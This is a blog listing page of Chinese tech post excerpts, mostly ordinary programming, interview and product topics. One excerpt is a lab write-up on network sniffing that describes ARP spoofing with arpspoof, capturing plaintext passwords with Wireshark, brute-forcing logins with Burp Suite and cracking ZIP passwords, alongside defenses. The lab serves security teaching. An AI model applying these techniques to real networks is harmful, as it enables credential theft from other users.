有一个好的项目可以对我们面试有很大的帮助，也会提起面试官的兴趣，因为很多问题是随着项目展开问的。并且我觉得最好是有落地项目的支撑，有一个实习经历是很好的，当然如果是大厂实习就更棒了！没有当然也没有关系， 现在有很多开源项目，或者教学视频，可以跟着动手做一做，或者自己添加一些可以唠嗑的亮点🤣切记要多问自己为什么，为什么要用这个技术？解决了什么问题？以及用到的技术与其他技术点的对比等等。且要考虑健壮性与特殊情况吧，很多面试官会当场对你的项目给你抛出问题，问你解决方案等。我们也可以适当留出空隙等他问（但是一定要会解决哦🤣）。当然场景题我们能提前准备，且解决方案越多越好被，择优选择，不单单是我们自己的项目，也可以多参考别人的问题（面经啦，同事的难点啦什么的），解决问题多了，自然大部分场景题都不至于没有思路回答不上来了。关于项目就不再多说啦，每个人有每个人的理解，但是网上资源很多的也，如果没有好项目可以自己寻找感兴趣的做一个两个哈。
算法
由于本人算法比较薄弱，算法实在给不出什么建议，就说说我自己准备了哪些吧，前期是看了牛客推出的 左神大佬的算法视频 讲的通俗易懂（有需要我可以帮忙翻一翻资料 😅 ），之后就是着手每天强制自己刷题做总结，感觉笨笨的我，随着日积月累，还是有所成长的 🤣， 面试中算法题大部分还是可以秒出来的，本人主要刷了 剑指offer 3-4遍 + leetcode 前450道 2-3遍左右的样子，主要是太笨了 😅刷了忘，忘了刷，没办法，那我就多做几遍好了。
如果时间不够，我建议还分类去准备一些常见的题目比较好，8大排序算法一定是要会的，然后就是可以针对链表、树分别找出常考的20-30道题目去做去吸收，还有一些DP、贪心、排列组合经典题目，图的话可能code的不多，但是图的算法还是要掌握的，必要时讲出来，拓扑、迪杰斯特拉、普利姆和克鲁斯卡尔啥的。
操作系统、计算机网络、数据结构
个人觉得这三类基础知识无论是前端、后端任何语言还是测开应该都会考的吧
数据结构
数据结构 ，无非就是数组、链表、栈、队列、树、图这几类，最重要的应该是对他们的使用场景和区别要有所了解。比如树的话，搜索树、平衡搜索树、红黑树、前缀树、B、B+这些。
可以多看面经和博客或者抽时间读一本书比较好，关于数据结构，我有读过 《大话数据结构》个人觉得还不错，适合入门。
计算机网络
关于计算机网络，《计算机网络自顶向下》 还是比较不错的，还有就是可以针对性看一看面经与牛友分享的文章，其实常问的就是那几个问题而已，例如：
说一说七层模型，各层都是干什么的？
有哪些协议？
TCP和UDP区别，各自的组成部分，基于TCP和UDP的应用层协议？
各自应用场景？
TCP三次握手、四次挥手、为什么三次握手？
四次挥手？
，三次挥手行不行，连接后客户端出现故障怎么办?
TCP如何保证可靠，拥塞控制过程？
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/312b5787fcc25dbc8a7dfec988c6e33a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/63ac1e430df86efd54f36170ca26376d/" rel="bookmark">
			网络嗅探（Sniffing）与身份认证
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 目的环境工具网络Sniffing内容Wireshark 监听网络流量，抓包。A（window）主机上外网，B(kaili)运行sinffer(Wireshark)选定只抓源为A的数据)。 ARP欺骗： ArpSpoof，实施ARP欺骗1.安装arpspoof2.在互联网上找到任意一个以明文方式传递用户帐号、密码的网站，截图Wireshark中显示的明文信息3.B是否能看到A和外网的通信 FTP数据还原1.查看FTP服务器的IP地址2.查看客户端登录FTP服务器的账号和密码3.客户端从FTP下载或查看了2个文件，一个为ZIP文件，一个为TXT文件，文件名分别是什么？4.还原ZIP文件并打开（ZIP有解压密码，试图破解，提示：密码全为数字，并为6位）。5.查看TXT文件的内容 MD5破解口令明文 John the Ripper的作用如何防止ARP攻击1.做好本机防护2.使用路由器实现IP与MAC绑定杜绝ARP攻击3.使用网管软件进行IP与MAC绑定 安全的密码（口令）应遵循的原则字典攻击中字典的重要性总结 目的 通过使用Wireshark软件掌握Sniffer（嗅探器）工具的使用方法，实现捕捉HTTP等协议的数据包，以理解TCP/IP协议中多种协议的数据结构、通过实验了解HTTP等协议明文传输的特性研究交换环境下的网络嗅探实现及防范方法，研究并利用ARP协议的安全漏洞，通过Arpspoof实现ARP欺骗以捕获内网其他用户数据。能利用BrupSuite实现网站登录暴力破解获得登录密码能实现ZIP密码破解，理解安全密码的概念和设置 环境 系统环境：Kali Linux 2、Windows网络环境：交换网络结构 工具 Arpspoof、WireShark、BurpSuite、fcrackzip（用于zip密码破解）
网络Sniffing内容 原理请看我的另一篇文章哟
https://blog.csdn.net/Woolemon/article/details/109556164
Wireshark 监听网络流量，抓包。 A（window）主机上外网，B(kaili)运行sinffer(Wireshark)选定只抓源为A的数据)。 首先我们需要确认kali和Windows处于同一网段（可相互ping通的状态)过程 接下来在kali中打开wireshark,用A(window)去ping B(kali),观察一下wireshark的反应
过滤语句：ip.scr==192.168.222.129(B的ip地址)
发现不能看到A和外网的通信（A刚输入的帐户和口令）再用A(window)ping 一下百度网址（www.baidu.com），观察wireshark反映
可观察到三个DNS包(2次域名解析),和十二个ICMP包(6次ping)，两个DHCP包，可通过报文分析获得相应信息
如：打开DNS的包可看见：
发现DNS为应用层协议,下层传输层采用UDP,再下层网络层是IP协议,然后是数据链路层的以太网帧.
可以从下层获得一些必要信息:
UDP(User Datagram Protocol)报文中:DNS的目的端口(Dst Port)
IPv4(Internet Protocol Version 4)报文中目的IP ARP欺骗： ArpSpoof，实施ARP欺骗 为了欺骗B，让B把报文全部发到A这里来。A需要冒充局域网中交换机的角色。（此时B为Window主机）
1.安装arpspoof 在安装这个包的过程中可能会遇到一些坑，解决方案：
建议更换kali源，否则有可能出现找不到的情况
1.kali中输入sudo vim /etc/apt/sources.list 2.输入 O,进入文件 3.按i键进入编辑模式 4.将所换源代替原来的 5.按ESC键退出编辑模式 6.shift+;进入外部编辑，再按输入qw保存并退出
安装过程使用sudo apt-get install dsniff命令
这里我们使用单向攻击（受攻击主机将数据发送到攻击主机，并由攻击主机转发至网关，网关将数据发送至服务器，服务器返回数据给网关，网关返回数据给受攻击主机）
首先确认kali的网关地址route -n和ip地址ifconfig。
可见kali网关地址为：192.168.222.2 ip地址：192.168.222.129
查看在同一个局域网的另一个ip
namp -v -sn 192.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/63ac1e430df86efd54f36170ca26376d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f046cf1b51f22874512cc6aed4762a31/" rel="bookmark">
			react项目拆分规则
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		拆分的原则 1.目录设计规范----根据作用和职责
2.模块定义规范----根据业务
3.代码设计规范----一般的代码规范
4.程序设计规范----一般原则(高内聚、低耦合等等)
react项目中的目录及职责拆分： 1.api需要单独封装,直接暴露返回值。
2.数据层使用react-redux,异步中间件使用redux-thunk。
3.视图层使用redux层面的传递过来的数据,修改逻辑也是重新触发action更改props。
4.静态类型的资源单独放置
5.公共组件、高阶组件、插件分开放置
6.工具类文件单独放置
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b5fd1b32e3eb6bb7def794873fcd0697/" rel="bookmark">
			资料分析之增长量
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一.增长量的计算 识别：
增长+单位
公式：
1.给出现期、基期：增长量=现期-基期
2.给出现期、增长率：增长量=r*现期/(1+r) 速算：
1.尾数法法：
选项尾数不同，则可以优先考虑尾数法做判断（只计算尾数变化）
选项数值差距大，则可以优先考虑估算法（看选项差距来对数据进行大约）
2.百化分（常用到）
第一步：|r|=1/n
第二部：增长量=现期/n+1;减少量=现期/n-1
常用的百化分表如下：
常考变换如下：
1.放缩法：1.43%=1/70（1/7=14.3%）；67%=1/1.5(1/15=6.7%)
2.取中法：表里面没有，但是他可能在离两个值都很近
15.4%与16.7%和14.3%都很近，那么他的值可以近似看作1/6与1/7之间，1/6.5
18.5%在20%和16.7%之间，我们可以将它近似看作1/5.5
3.公式法
直接除：5.9%,直接用100除以5.9，约等于17，为1/17，简单暴力。
二.增长量的比较 识别：增长最多/最少，下降最多/最少
题型：
1.已知：现期/基期，比较增长量
增长量=现期-基期
2.已知：现期、增长率，比较增长量
口诀：大大则大，一大一小百化分（上述增长量计算）
三.年均增长量 （现期-基期）/n（n为年份差）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/99df6a69d295b718339d9c450fcefa66/" rel="bookmark">
			ASCII码排序（多实例测试）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 ASCII码排序（多实例测试） 1.描述 输入三个字符后，按各字符的ASCII码从小到大的顺序输出这三个字符。
输入
输入数据有多组，每组占一行，有三个字符组成，之间无空格。
输出
对于每组输入数据，输出一行，字符中间用一个空格分开。
样例输入
qwe
asd
zxc
样例输出
e q w
a d s
c x z
2.代码 #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main() { char a,b,c,temp; while(scanf("%c%c%c",&amp;a,&amp;b,&amp;c)!=EOF) { getchar(); if(a&gt;b) { temp=a;a=b;b=temp; } if(a&gt;c) { temp=a;a=c;c=temp; } if(b&gt;c) { temp=b;b=c;c=temp; } printf("%c %c %c\n",a,b,c); } return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b353a4e75a9a81f7437cb03bef7f2d87/" rel="bookmark">
			编写代码的两种视角
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		http://tommwq.tech/blog/2020/11/11/201
横看成岭侧成峰，远近高低各不同。不识庐山真面目，只缘身在此山中。
《题西林壁》
从多个的角度观察事物，可以看到不同的现象。对软件来说也是如此。以电子邮件软件为例，从用户角度看，软件是邮箱和邮件。从管理员角度看，软件由账户和邮箱构成。从运维人员的角度看，软件由程序、配置、数据、进程等组成。使用者通过软件执行业务操作，达成业务目标。不同类别的使用者拥有不同的业务目标，执行不同的业务操作。因此在他们眼中，同一个软件有着不同的样子。对于构成软件的模块和对象，也存在着不同的观察视角，4+N视图正是这些视角的体现。不过本文希望讨论的，不是架构或系统层面的视角，而是代码层面的两种视角。
三十辐共一毂，当其无，有车之用。埏埴以为器，当其无，有器之用。凿户牖以为室，当其无，有室之用。故有之以为利，无之以为用。
《道德经》
编写代码有两种常见的视角。一种从代码自身出发，忽略代码所具备的业务含义。这种视角把代码看作一组没有业务含义的变量和函数，一个脱离了业务背景的状态机。
Listing 1: 以软件视角编写的代码
public void login(LoginRequest request, LoginResponse response) { String accountType = request.getAccountType(); String username = request.getUsername(); String password = request.getPassword(); boolean success = false; if ("baidu".equals(accountType)) { success = baiduLogin(username, password); } else if ("qq".equals(accountType)) { success = qqLogin(username, password); } else if ("weibo".equals(accountType)) { success = weiboLogin(username, password); } else if ("wx".equals(accountType)) { success = wxLogin(username, password); } else if ("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b353a4e75a9a81f7437cb03bef7f2d87/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/686ef9987c720c7bf7878dc9377b2554/" rel="bookmark">
			linux上用键盘控制鼠标的软件_打通win和mac双机无缝控制只用这套键鼠——罗技MX Keys键盘&#43;MX MA | 数字尾巴 分享美好数字生活...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作为一个因为主要从事图片处理和视频编辑因而mac作为主力机的用户，我其实已经习惯了macbook的键盘手感。日常用键程较长的机械键盘总会有反差，来回切换更是遭罪。最近终于放下了大家都说好的机械键盘，尝试一波罗技MX Keys键盘，上手的初衷主要是两点：外观方面这家伙跟妙控键盘有着基本类似的键程和金属外观，手感预期接近；功能方面MX Keys键盘支持连接多款设备并有实体键随意切换，我刚好有多设备需求，桌面摆两套键鼠是不科学的。上手键盘自然也就想着配个鼠标，看到官方推荐了MX Master3鼠标。一套上手下来，发现这套对Mac有优化，支持win、mac和linux系统的键鼠套装，其双机无缝切换操控功能可谓正中我的痛点，具体如何，我们一步一步揭晓。
开箱：罗技开始环保了 如此高规格且精致的键鼠套装，请容我开箱嘚瑟一波。首先摆一起拍个合影，发现跟mac沾边的包装，非黑即白，哈哈，格调确实不错。
MX Keys键盘
正面商品图，注意左上角标明键盘结构，跟15款以及19款之后的macbook为同款结构设计，与饱受诟病的16-18款的蝶式键盘手感不可同日而语。
包装背面是商品的主要产品特性，我们稍后详解。
打开包装是套娃设计，内部还有一层纸箱。
再次打开是被白色环保柔性纸张包裹着的键盘本体，这次环保下功夫了。一般来讲，键盘都是塑料袋包裹的。
取出全部内容物，包含：MX Keys键盘本体、推广自家键鼠套装的MX Master3介绍卡、type-c充电线以及蓝牙适配器。标配蓝牙适配器绝对好评，这样没有蓝牙模块的台式机就不用另购了。
MX Master3鼠标
相同画风的包装。右上角Magspeed字样突出了MX Master3鼠标卓越滚动性能，到底有多卓越我们稍后展示。
背面也是产品特性，高效办公、舒适支撑、多种工作表面。
打开也是套娃设计，没有塑料的支撑，双重纸盒比较稳妥。
内部依然是纯纸板结构，做了对应的纸板形状以保证运输的稳定。这波包装还是赞一下的。
取出全部内容物，包括：MX Master3鼠标本体、推广自家键鼠套装的MX Keys介绍卡、type-c充电线以及蓝牙适配器。
最后来个键鼠外观的合影，我其实觉得罗技这么推这套键鼠套装，可以来一个combo，只需要配一套充电线和适配器就够啦，更环保。
外观体验：和机械键盘不同的另一种舒适 如果说常见的高端键鼠基本都是电竞向，多键无冲的按键设计、多到忘记操作的鼠标按键，那其实办公向的键鼠并不需要这些。罗技MX Keys键盘和MX Master3鼠标就在这个需求方面深挖得较为透彻。
MX Keys键盘外观
一体式的金属键盘本体，给人稳重办公风格的同时，也是真的稳。放在桌面上即使不配键鼠垫，也不易产生滑移。
为什么稳呢？背面有六块脚垫。
按键细节方面
球形凹面按键，配合哑光涂层的质感，我想说这个按键的敲击触感，和传统的整体无涂层的ABS材质、PBT材质键帽而言，触感更加细腻微妙。
按键键程较为舒适，不像机械键盘键程那么长，更有利于高效办公操作。按键几乎没有声音，这对办公环境来说太重要了。任何机械键盘，即便静音轴，也不会有MX Keys键盘这么安静。
背光方面
MX Keys键盘契合mac用户的使用习惯，白光方便弱光工作又不像RGB那样让人误以为你不在工作。更妙的是，这套键盘灯比mac本体的键盘灯还要先进。
具体来讲，macbook的键盘灯可以依托mac的光线传感器感应光线，而后自动亮起键盘灯。
但是，MX Keys键盘更为智能，ta的传感器可以根据照明条件调整背光强度的同时，可以自动感应首部位置，手部离开则自动熄灭键盘灯，同时自动调节明暗和根据使用场景调整开关，MX Keys键盘这套智能背光可以说是无敌了。
当然了，对于强迫症来说，ta也支持手动调节。
接口方面
MX Keys键盘采用USB-Type C接口，充电一次可以正常使用十天。如果你关闭背光，可以达到最长5个月的使用时间。
MX Master3鼠标外观
外形方面
这款MX Master 3鼠标的外形一看你就会感觉到其绝对是在人体工学上花了心思，各个按键也都放置在了手指方便触及的位置。
握持起来，完全贴合了手部握持。
底部的光学引擎，甚至在玻璃上也能够正常使用，官方的说法是：MX Master 3鼠标几乎使用所有表面。
细节方面
MX Master 3鼠标的Magspeed滚轮和拇指滚轮全部是金属材质，质感非常不错。
接口方面
和MX Keys一样都是Type-C接口，充电一次可以使用70天，更有充电1分钟使用3小时的极速充电表现。可以说是解决了无线鼠标临时没电的痛点。
功能：为办公和专业工作量身打造 MX Keys键盘——多设备多系统连接支持
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/686ef9987c720c7bf7878dc9377b2554/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/322f4e0aa4d925363ae25d2ba7fe2fe1/" rel="bookmark">
			记录一些实用的SQL
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、oracle sql查询某个表有多少列
SELECT COUNT(*) FROM USER_TAB_COLUMNS WHERE TABLE_NAME=UPPER('表名') select count(*) from all_tab_colums t where 1=1 and t.table_name = '表名' and t.owner = '所属用户名' 2、查询一个表按照其中一列分组，按照另一列排序，并且增加一个排序列记录
ROW_NUMBER() OVER (PARTITION BY 表中列名 ORDER BY 表中列名 DESC) AS 新加的排序列名 3、列转行
原表
查询的sql
select user_name, '语文' COURSE , CN_SCORE as SCORE from test_tb_grade2 union select user_name, '数学' COURSE, MATH_SCORE as SCORE from test_tb_grade2 union select user_name, '英语' COURSE, EN_SCORE as SCORE from test_tb_grade2 order by user_name,COURSE 结果表
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/322f4e0aa4d925363ae25d2ba7fe2fe1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8194d484250aa0a956de5c3a38fe4efb/" rel="bookmark">
			python名词解释-python中必要的名词解释
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.Django框架
Django是一个开放源代码的Web应用框架，由Python写成。它采用 了MVC的框架模式，即模型（M）、视图（V）和控制器（C）。相比 其他Web框架，Django的优势是：大而全，集成了ORM、模型绑定、模 板引擎、缓存和Session等诸多功能。
2.HTTP
HTTP即超文本传输协议（Hypertext Transfer Protocol），是基于请 求/响应范式的（相当于客户机/服务器）。一台客户机与服务器建立连 接后，发送一个请求给服务器；服务器接到请求后，给予相应的响应信 息。HTTP的默认端口是80，可以不写。
3.MySQL数据库
MySQL是一种关系型数据库。它将数据保存在不同的表中，而不 是将所有数据放在一个大仓库内，这样增加了运行速度并提高了灵活 性。
MySQL有以下特点：
（1）是开源的，无须支付费用就可以直接用。
（2）使用标准的SQL数据语言形式。
（3）相对于Oracle和SQL Server，MySQL更小，更轻量级，当然更 适合测试。
答疑
（1）前端页面已经做了“非必填”判断，为什么接口还要做非必填 参数的校验？是不是多此一举？
这并不是多此一举，而是双重保护。通常，对于必填参数的校验，前/后端都要做。前端做校验，一方面是给用户友好的提示；另一方面 是最直接的系统保护，减少了对后端的请求。而后端做校验，一方面， 如果前端没有做保护，则后端不至于出错；另一方面（也是最重要 的），如果用户绕过前端的请求直接调用接口则不至于出错。
（2）前端开发、后端开发是什么意思？
前端开发
一般指的是Web前端开发，即网站前端页面（即网页的页 面）的开发。简单地说，网站前端工程师负责网站中用户可见的内容开 发，如网页上的特效、网页的布局、图片和视频等。网站前端工程师的 工作内容是，将美工设计的效果图设计成浏览器可以运行的网页，并和 后端开发工程师配合，做网页的数据显示和交互。
后端开发
后端开发一般负责网站后台逻辑的设计和实现，以及用户及网站的 数据的保存和读取。比如，在前端实现了登录页面，那么当用户输入账 号和密码并单击“登录”按钮时，其实前端已经完成了自己的事件，然后 就是等待后端返回账号和密码校验结果，前端根据这个校验结果来显示 登录成功、账号或密码错误等提示信息。
（3）前/后端开发的顺序是什么？
在实际的项目开发中，前/后端开发是并行开展的，它们之间能并 行的关键是接口文档，前/后端开发都要依据接口文档来做各自对应的 事情
以上就是本次介绍的相关知识点内容，感谢大家的学习和对脚本之家的支持。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bcdae2538ce4cdca1085a98de46ac0ca/" rel="bookmark">
			Android 6.0 以上动态获取权限(亲测可用)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		至从android6.0之后，权限在清单文件AndroidManifest.xml里面申明都没有作用了，所以今天如果开发每一款app，都需要动态获取权限，那么我们将怎么动态获取权限呢？下面我举个列子我们需要获取的权限有存储权限、电话权限、定位权限、相机权限。获取权限代码相对固定，复制粘贴就可以。只是贴出主要代码,大家注重思路即可。权限有些是在app内部调用相关功能的时候赋予权限，而有些是在一开始初始化就处理，我这里是后者
1 AndroidManifest.xml 中直接声明所需权限
&lt;!--存储权限--&gt;
&lt;uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /&gt;
&lt;!--电话权限--&gt;
&lt;uses-permission android:name="android.permission.CALL_PHONE"/&gt;
&lt;!--相机权限--&gt;
&lt;uses-permission android:name="android.permission.CAMERA"/&gt;
&lt;!--定位权限--&gt;
&lt;uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" /&gt;
2、MainActivity,一般权限实在引导页处理，但是因为性能问题，我就只写了一个MainActivity。但是都一样。
（1）声明权限变量，以数组形式表示
// 要申请的权限
private String[] permissions = {Manifest.permission.WRITE_EXTERNAL_STORAGE,Manifest.permission.CALL_PHONE,
Manifest.permission.CAMERA,Manifest.permission.ACCESS_COARSE_LOCATION};
（2）onCreate生命周期里面进行判断是否拥有权限，可以写成循环，我只有几个权限就没有写了
// 版本判断。当手机系统大于 23 时，才有必要去判断权限是否获取 if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.M) { // 检查该权限是否已经获取 int i = ContextCompat.checkSelfPermission(getApplicationContext(), permissions[0]); int l = ContextCompat.checkSelfPermission(getApplicationContext(), permissions[1]); int m = ContextCompat.checkSelfPermission(getApplicationContext(), permissions[2]); int n = ContextCompat.checkSelfPermission(getApplicationContext(), permissions[3]); // 权限是否已经 授权 GRANTED---授权 DINIED---拒绝 if (i != PackageManager.PERMISSION_GRANTED || l !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bcdae2538ce4cdca1085a98de46ac0ca/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d25c767ee3df782c0b0563b25cc215c1/" rel="bookmark">
			数据库：表单查询
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 数据库：表单查询 select * form 表名
格式select 列名1 列名n from 表名；格式2 select 表名，列名1，表名，列名n from表名 查询两个字符的数据
select * from 表名 where 列名 like'__'; 查询一个或另一个数据，%代表查询前或后n个字符
select top 2 * from 表名 where 列名 like '[名称，名称]%'; 字符集取反
[^内容] 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/13aeba50218b5fc2f1efca8a07c54dec/" rel="bookmark">
			用Python自动生成Excel报表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在日常工作中，可能会有一些重复无聊的任务，比如说，从 Excel 或数据库中收集一些数据，设置相应的数据格式并做成报表。
类似这种重复无聊的任务，我们完全可以交给 Python 去自动完成，只要第一次把 Python 代码写好，以后就可以一键完成，省时省力，还不容易出错，这是提升工作质量和工作效率的利器，让我们能够腾出时间和精力，去做更有价值的事情。
1. 安装和导入模块 以 Python 中的 openpyxl 模块为例，它能够读取和修改 Excel 文件，如果你还没有安装，可以通过以下命令进行安装：
pip install openpyxl 要测试 openpyxl 是否正确安装，可以在 Jupyter Lab 中运行以下代码：
# 导入库 import openpyxl # 查看版本 openpyxl.__version__ 如果该模块正确安装，那么会输出版本号，假如你在使用过程中遇到问题，可以查阅官方文档。
2. 读取和处理数据 为了演示用 Python 自动生成 Excel 报表，我从网上找了一个数据集，是一家跨国公司的 54 万多行在线零售业务的交易数据，你可以进入公众号「林骥」的后台，回复「零售」两个字，获取该数据集的完整下载链接。
把这个数据文件保存到代码上级目录的 data 文件夹，然后用 Pandas 读取它：
# 读取数据 import pandas as pd df = pd.read_excel('../data/Online Retail.xlsx') df 其中每一列代表的含义如下：
InvoiceNo：发票编号 StockCode：产品代码 Description：产品名称 Quantity：产品数量 InvoiceDate：开票时间 UnitPrice：产品单价 CustomerID：客户编号 Country：国家名称 为了统计每天的销售额，我们先在数据中增加两列：日期和销售额，然后用函数实现汇总：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/13aeba50218b5fc2f1efca8a07c54dec/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/598bea70ebe61402ad98d76c67f93655/" rel="bookmark">
			Python“Non-ASCII character ‘xe5‘ in file”报错
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		出现问题的原因：
Python默认以ASCII作为编码方式，如果在自己的Python源码中包含了中文（或者其他非英语系的语言），就会出现该报错。
解决办法：在开头添加编码声明
# -*- coding: utf-8 -*- 或者
# coding=utf-8 python 支持3种编码声明，一般常用能见到下面两种: 1.# -*- coding: utf-8 -*-
这种写法是为了兼容Emacs的编码声明
2.# coding=utf-8
这种写法短一点，但Emacs不能用
在python 文件开头（一般是第一行或第二行），用来说明你的Python源程序文件用使用的编码。缺省情况下你的程序需要使用ascii码来写，但如果在其中写中文的话，python解释器一般会报错，但如果加上你所用的文件编码，python就会自动处理不再报错。
这里要注意的是：
1.coding 后面使用 “:” 或 “=” 都可以
2 “:” 或 “=” 必须和 coding之间不能有空格。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/25c112af799d1b124cb419ef3d890c6f/" rel="bookmark">
			usbeam hosts editor网盘下载_《APEX英雄》Origin平台下载慢及常见错误解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这几天关注《APEX英雄》这款游戏的小伙伴越来越多，不过想要玩上EA的游戏，第一个挑战就是EA自家的游戏平台：Origin（烂橘子）。
作为老战地玩家或者极品玩家对橘子的烂肯定是有着深切体会；下载缓慢，界面卡顿，经常出错；而且挂上加速也没法解决。 今天福利喵在这里为大家总结一下烂橘子平台常见错误的解决方法。 一、平台页面加载慢，游戏下载缓慢 所需工具： Origin_CDN UsbEAm+Hosts+Editor 步骤： 首先打开Origin_CDN，选择“Akamai模式”，如果默认是Akamai就不用更改了。
然后打开 UsbEAm+Hosts+Editor，点击左下角图标，选择“Origin-游戏下载akamai-cdn”。 点击“检测延迟”，找到延迟最低IP地址，选中后点击“应用选中”。 选中后便可以关闭软件，打开Origin看看下载速度是否提升，如果提示下载失败等错误，再次打开 UsbEAm+Hosts+Editor，点击“清除当前”，再选择其他延迟低的IP地址继续测试。 好友列表或商店加载慢，也可以通过该软件进行优化加速。 二、Origin载入页面时发生错误 烂橘子经常抽风，有时候在开启平台时会弹出“Origin载入页面时发生错误”的提示。 解决方法： 删除C盘AppData里面的local和romaing的origin文件。 C:Users&lt;用户&gt;&lt;你的用户名&gt;AppDataLocalOrigin C:Users&lt;用户&gt;&lt;你的用户名&gt;AppDataRoamingOrigin 如果没有AppData文件夹，需要显示隐藏文件夹。 删除两个origin文件后，再次打开平台，稍作加载后便可进入平台。 三、下载错误:-4:302 两种解决方法，一种是更改电脑IP地址，需要的工具小伙伴们都懂。这里福利喵介绍下第二种方法。 先打开橘子平台，点击左上角的"origin"按钮,选择"应用程序设定"。
在设置窗口,点击"诊断"选项卡，拖动到下方,打开"安全模式下载"。 应用保存后即可下载游戏。
工具下载地址除了百度也可以关注公众号【ACG资讯福利喵】，有详细下载地址和更多游戏方面的内容。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4ab0efb14504eeacb050a1b7a8317702/" rel="bookmark">
			Android音频系统AudioTrack使用方法详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、Android AudioTrack简介
在android中播放声音可以用MediaPlayer和AudioTrack两种方案的，但是两种方案是有很大区别的，MediaPlayer可以播放多种格式的声音文件，例如MP3，AAC，WAV，OGG，MIDI等。而AudioTrack只能播放PCM数据流。
事实上，两种本质上是没啥区别的，MediaPlayer在播放音频时，在framework层还是会创建AudioTrack，把解码后的PCM数流传递给AudioTrack，最后由AudioFlinger进行混音，传递音频给硬件播放出来。利用AudioTrack播放只是跳过Mediaplayer的解码部分而已。Mediaplayer的解码核心部分是基于OpenCORE 来实现的，支持通用的音视频和图像格式，codec使用的是OpenMAX接口来进行扩展。因此使用audiotrack播放mp3文件的话，要自己加入一个音频解码器，如libmad。否则只能播放PCM数据，如大多数WAV格式的音频文件。
如果是实时的音频数据，那么只能用AudioTrack进行播放。
2、如何使用AudioTrack进行音频播放
这里需要解释下两个东西：
1.AudioTrack.MODE_STREAM：
AudioTrack中有MODE_STATIC和MODE_STREAM两种分类。STREAM的意思是由用户在应用程序通过write方式把数据一次一次得写到audiotrack中。这个和我们在socket中发送数据一样，应用层从某个地方获取数据，例如通过编解码得到PCM数据，然后write到audiotrack。
这种方式的坏处就是总是在JAVA层和Native层交互，效率损失较大。
而STATIC的意思是一开始创建的时候，就把音频数据放到一个固定的buffer，然后直接传给audiotrack，后续就不用一次次得write了。AudioTrack会自己播放这个buffer中的数据。
这种方法对于铃声等内存占用较小，延时要求较高的声音来说很适用。
2.StreamType
这个在构造AudioTrack的第一个参数中使用。这个参数和Android中的AudioManager有关系，涉及到手机上的音频管理策略。
Android将系统的声音分为以下几类常见的（未写全）：
STREAM_ALARM：警告声
STREAM_MUSCI：音乐声，例如music等
STREAM_RING：铃声
STREAM_SYSTEM：系统声音
STREAM_VOCIE_CALL：电话声音
为什么要分这么多呢？以前在台式机上开发的时候很少知道有这么多的声音类型，不过仔细思考下，发现这样做是有道理的。例如你在听music的时候接到电话，这个时候music播放肯定会停止，此时你只能听到电话，如果你调节音量的话，这个调节肯定只对电话起作用。当电话打完了，再回到music，你肯定不用再调节音量了。
其实系统将这几种声音的数据分开管理，所以，这个参数对AudioTrack来说，它的含义就是告诉系统，我现在想使用的是哪种类型的声音，这样系统就可以对应管理他们了。
代码里首先获取最小的分配内存，然后创建AudioTrack，最后通过mAudioTrack.write(data, offset, length);将音频数据进行播放。
android音频系统之AudioTrack的使用就讲完了。
就这么简单。
以上就是本文的全部内容，希望对大家的学习有所帮助。
	</div>
